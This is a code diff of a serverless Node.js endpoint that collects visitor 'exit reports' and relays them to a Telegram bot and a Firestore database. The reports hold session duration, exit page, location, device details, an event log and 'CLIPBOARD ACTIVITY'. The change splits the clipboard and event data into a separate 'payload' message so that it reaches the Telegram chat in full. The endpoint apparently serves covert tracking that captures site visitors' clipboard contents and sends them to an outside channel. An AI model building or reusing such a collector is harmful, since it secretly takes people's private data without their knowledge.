@@ -28,7 +28,7 @@ module.exports = async (req, res) => {
     if (req.method === 'OPTIONS') return res.status(200).end();
     if (req.method !== 'POST') return res.status(200).send('OK');
 
-    // --- FINAL FORTRESS PARSING (V41) ---
+    // --- FINAL FORTRESS PARSING (V42) ---
     let data = {};
     const rawBody = req.body;
 
@@ -37,7 +37,6 @@ module.exports = async (req, res) => {
             data = rawBody;
         } else {
             const bodyStr = Buffer.isBuffer(rawBody) ? rawBody.toString() : String(rawBody);
-            // Hybrid Parse: Try JSON, then Form
             if (bodyStr.trim().startsWith('{')) {
                 data = JSON.parse(bodyStr);
             } else if (bodyStr.includes('=')) {
@@ -48,7 +47,7 @@ module.exports = async (req, res) => {
             }
         }
     } catch (e) {
-        console.error("V41 Parse Error:", e.message);
+        console.error("V42 Parse Error:", e.message);
     }
 
     const {
@@ -64,7 +63,7 @@ module.exports = async (req, res) => {
     } = data;
 
     if (!sessionID) {
-        console.error("400: Missing Session ID. Body type:", typeof rawBody);
+        console.error("400: Missing Session ID");
         return res.status(400).send('Missing Session ID');
     }
 
@@ -73,41 +72,49 @@ module.exports = async (req, res) => {
 
     try {
         const brandingLink = `<a href="https://omeryigitler.com/assets/logo.png">&#x200b;</a>`;
-        let msg = brandingLink +
+
+        // 1. SUMMARY MESSAGE
+        const summaryMsg = brandingLink +
             `🛑 <b>TAURUS EXIT REPORT [${sessionID}]</b>\n` +
             `━━━━━━━━━━━━━━━━━━━━━━\n\n` +
             `⏱ <b>DURATION:</b> <code>${duration}s</code>\n` +
             `📍 <b>EXIT PAGE:</b> <code>${exitPage}</code>\n` +
             `🌍 <b>LOCATION:</b> <code>${location || 'Unknown'}</code>\n` +
             `💻 <b>DEVICE:</b> <code>${deviceInfo || 'Unknown'}</code>\n\n` +
-            `📋 <b>CLIPBOARD ACTIVITY:</b>\n<pre>${clipboard || 'None'}</pre>\n\n` +
-            `📝 <b>EVENT LOG (Last 20):</b>\n<pre>${eventLog || 'No events recorded'}</pre>\n\n` +
             `━━━━━━━━━━━━━━━━━━━━━━`;
 
-        // Safety Truncation for Telegram (Max 4096 chars)
-        if (msg.length > 4090) {
-            msg = msg.substring(0, 4000) + "\n\n... (Report Truncated due to Length)";
-        }
+        // 2. PAYLOAD MESSAGE (SECOND MESSAGE)
+        const payloadMsg = `📋 <b>CLIPBOARD ACTIVITY:</b>\n<pre>${clipboard || 'None'}</pre>\n\n` +
+            `📝 <b>EVENT LOG (Last 20):</b>\n<pre>${eventLog || 'No events recorded'}</pre>`;
 
-        // 1. Send Telegram Notification (Backend - Reliable)
+        // DELIVERY STACK
         let telegramSent = false;
         try {
+            // Send Summary
             await axios.post(`https://api.telegram.org/bot${finalBotToken}/sendMessage`, {
                 chat_id: finalChatId,
-                text: msg,
+                text: summaryMsg,
                 parse_mode: 'HTML',
                 disable_web_page_preview: false
             });
+
+            // Send Payload (The "Second Message")
+            await axios.post(`https://api.telegram.org/bot${finalBotToken}/sendMessage`, {
+                chat_id: finalChatId,
+                text: payloadMsg.substring(0, 4090),
+                parse_mode: 'HTML'
+            });
+
             telegramSent = true;
         } catch (tgErr) {
             console.error("Telegram delivery failed:", tgErr.message);
         }
 
-        // 2. Save to Firestore messages collection
+        // 3. Save to Firestore
         await db.collection('messages').add({
             name: "System Report",
             email: "tracker@taurus.sys",
-            message: msg.replace(/<[^>]*>/g, '').substring(0, 5000),
+            message: (summaryMsg + "\n" + payloadMsg).replace(/<[^>]*>/g, '').substring(0, 5000),
             timestamp: admin.firestore.FieldValue.serverTimestamp(),
             status: 'new',
             type: 'report',
